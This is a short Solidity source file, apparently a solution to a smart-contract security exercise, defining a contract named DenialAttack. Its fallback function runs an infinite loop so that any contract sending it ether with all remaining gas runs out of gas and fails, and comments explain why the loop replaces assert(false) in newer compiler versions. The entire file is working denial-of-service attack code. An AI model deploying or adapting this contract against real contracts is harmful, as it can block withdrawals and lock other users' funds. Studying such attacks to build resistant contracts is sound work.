pragma solidity ^0.8.19;
// SPDX-License-Identifier: MIT

import "hardhat/console.sol";

contract DenialAttack {

  fallback() external payable {
    while (true) {

    }
    // Seems assert() doesn't take up all gas anymore for solidity version > 0.8
    // https://hackernoon.com/an-update-to-soliditys-assert-statement-you-mightve-missed
    // So using an infinite loop instead to take up all gas.
    // assert(false);
  }

}
